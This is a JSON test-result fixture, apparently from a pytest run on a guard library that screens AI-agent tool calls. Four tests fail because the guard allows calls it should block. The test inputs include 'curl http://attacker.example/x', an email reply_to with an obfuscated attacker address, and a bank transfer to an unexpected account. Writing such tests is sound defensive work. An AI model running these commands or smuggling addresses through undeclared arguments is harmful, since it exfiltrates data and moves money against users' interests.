@@ -1,0 +1,28 @@
+{
+ "kind": "tests",
+ "options": {},
+ "source": "pytest run on a copy of agentfirebreak-repo (m5-no-undeclared)",
+ "facts": {
+  "contains": [
+   "tests/test_guard.py::test_undeclared_argument_cannot_smuggle_an_address",
+   "tests/test_hardening.py::test_listing_a_parameter_in_params_does_not_switch_checking_off",
+   "tests/test_hardening.py::test_obfuscated_spellings_in_call_arguments_are_normalised",
+   "tests/test_hardening.py::test_bare_account_id_in_an_undeclared_argument_is_checked",
+   "AssertionError: assert <Effect.ALLOW: 'allow'> is <Effect.BLOCK: 'block'>",
+   "+  where <Effect.ALLOW: 'allow'> = Decision(effect=<Effect.ALLOW: 'allow'>, rule_id='allow-clean', reason='send_email: no untrusted value reaches a sensitive parameter.', risk=<Risk.EXTERNAL: 'external'>, tainted=True, sensitive=False, findings=[], signals=[]).effect",
+   "+  and   <Effect.BLOCK: 'block'> = Effect.BLOCK",
+   "+  where <Effect.ALLOW: 'allow'> = effect(<agent_firebreak.guard.Guard object at 0x000001C7483E6C30>, 'run_shell_loose', command='curl http://attacker.example/x')",
+   "+  where <Effect.ALLOW: 'allow'> = effect(<agent_firebreak.guard.Guard object at 0x000001C7483E70B0>, 'send_email', to='me@corp.example', body='b', reply_to='drop [at] attacker [dot] example')",
+   "+  where <Effect.ALLOW: 'allow'> = effect(<agent_firebreak.guard.Guard object at 0x000001C747960050>, 'transfer', account='ACC-1001', amount=250, beneficiary='ACC-9999')",
+   "assert d.effect is Effect.BLOCK",
+   "assert effect(g, \"run_shell_loose\", command=\"curl http://attacker.example/x\") is Effect.BLOCK",
+   "assert effect(g, \"send_email\", to=\"me@corp.example\", body=\"b\", reply_to=\"drop [at] attacker [dot] example\") \\",
+   "assert effect(g, \"transfer\", account=\"ACC-1001\", amount=250, beneficiary=\"ACC-9999\") is Effect.BLOCK",
+   "tests\\test_guard.py:109",
+   "tests\\test_hardening.py:60",
+   "tests\\test_hardening.py:65",
+   "tests\\test_hardening.py:72",
+   "4 failed, 69 passed in 4.16s"
+  ]
+ }
+}
